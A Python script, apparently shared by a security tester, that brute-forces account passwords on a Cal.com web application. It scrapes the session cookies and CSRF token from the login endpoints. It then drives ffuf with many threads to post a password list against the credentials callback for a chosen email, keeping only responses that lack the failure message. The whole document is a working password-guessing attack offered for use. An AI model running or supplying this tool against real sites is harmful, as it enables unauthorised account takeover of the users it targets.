# Script I found useful for assessing the bruteforce protections of calcom application.
# It does protect the login page with trottling, but this could still be useful given enough time as there is no failed login attempt threshold

import requests  
import subprocess  
import argparse  
  
# Creating parser arguments and configuring it  
parser = argparse.ArgumentParser(  
    description="Calcom web application bruteforcer. It automatically scrapes the required cookies and POST parameters, then passes them to ffuf for fast bruteforcing."  
)  
parser.add_argument("-u", "--url", required=True, type=str, help="Base URL of the target. Example: https://example.com")  
parser.add_argument("-e", "--email", required=True, type=str, help="Email address of the target user. Example: admin@example.com")  
parser.add_argument("-p", "--passwords", required=True, type=str, help="Password list to use.")  
parser.add_argument("-t", "--threads", default=40, type=int, help="Number of threads for ffuf, default 40.")  
args = parser.parse_args()  
  
# Create session object  
s = requests.Session()  
s.verify = False  
  
BASE_URL = args.url  
# Retrieve clnds cookie  
clnds_url = f"{BASE_URL}/auth/login"  
r = s.get(url=clnds_url, verify=False)  
  
# Retrieve next-auth.csrf-token and next-auth.callback-url cookies  
session_url = f"{BASE_URL}/api/auth/session"  
r = s.get(url=session_url, verify=False)  
  
# Retrieve csrftoken  
csrf_url = f"{BASE_URL}/api/auth/csrf"  
r = s.get(url=csrf_url, verify=False)  
response_dictionary = r.json()  
csrfToken = response_dictionary["csrfToken"]  
  
#Construct post data  
DATA = {  
    'email': 'test@test.com',  
    'password': 'password',  
    'csrfToken': csrfToken,  
    'callbackUrl': f"{BASE_URL}/",  
    'redirect': 'false',  
    'json': 'true'  
}  
  
# Preparing cookies for ffuf  
cookies_dict = s.cookies.get_dict()  
clnds = cookies_dict.get("__clnds", "")  
next_auth_csrf_token = cookies_dict.get("next-auth.csrf-token", "")  
next_auth_callback_url = cookies_dict.get("next-auth.callback-url", "")  
  
cookie_str = (  
    f"__clnds={clnds}; "  
    f"next-auth.csrf-token={next_auth_csrf_token}; "  
    f"next-auth.callback-url={next_auth_callback_url}"  
)  
  
# Bruteforce with ffuf  
command = [  
    "ffuf",  
    "-c", "-u", f"{BASE_URL}/api/auth/callback/credentials?",  
    "-w", args.passwords,  
    "-X", "POST",  "-H", "Content-Type: application/x-www-form-urlencoded",  
    "-d", f'email={args.email}&password=FUZZ&csrfToken={csrfToken}&callbackUrl={BASE_URL}/&redirect=false&json=true',  
    "-b", cookie_str,  
    "-fr", 'incorrect-email-password',  
    "-t", str(args.threads)  
]  
print("[+] Bruteforcing with ffuf...")  
print(" ".join(command))  
result = subprocess.run(command)
